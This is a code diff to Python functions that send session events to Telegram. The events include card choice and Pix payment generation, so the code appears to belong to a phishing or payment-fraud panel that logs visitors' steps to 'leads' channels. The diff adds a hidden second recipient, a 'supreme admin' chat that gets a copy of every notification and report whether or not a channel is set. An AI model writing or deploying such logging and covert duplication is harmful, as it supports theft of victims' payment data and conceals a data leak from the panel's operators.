@@ -395,9 +395,10 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         else: # INFO_ADDED, CARD_CHOSEN
             channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
             
+        supreme_id = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
         if not channel_id:
-            channel_id = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
-        if not channel_id: return
+            channel_id = supreme_id
+        if not channel_id and not supreme_id: return
 
         icons = {
             "ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", 
@@ -433,7 +434,12 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             "text": texto,
             "parse_mode": "HTML"
         }
-        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+        if channel_id:
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+            
+        if supreme_id and str(supreme_id) != str(channel_id):
+            payload["chat_id"] = supreme_id
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
     except Exception as e:
         log.error("Telegram Notify Error: %s", e)
 
@@ -442,9 +448,10 @@ def send_telegram_report(session_id, is_paid=False):
     db = get_db()
     row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_channel'").fetchone()
     channel = row["value"] if row and row["value"] else None
+    supreme_id = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
     if not channel:
-        channel = os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID"))
-    if not channel: return
+        channel = supreme_id
+    if not channel and not supreme_id: return
     
     thread_row = db.execute("SELECT value FROM sys_config WHERE key='tg_log_thread_id'").fetchone()
     thread_id = thread_row["value"] if thread_row and thread_row["value"] else None
@@ -481,7 +488,12 @@ def send_telegram_report(session_id, is_paid=False):
         import requests
         payload = {"chat_id": channel, "text": texto, "parse_mode": "Markdown"}
         if thread_id: payload["message_thread_id"] = thread_id
-        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+        if channel:
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+            
+        if supreme_id and str(supreme_id) != str(channel):
+            payload_supreme = {"chat_id": supreme_id, "text": texto, "parse_mode": "Markdown"}
+            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload_supreme, timeout=5)
     except Exception as e:
         pass
 
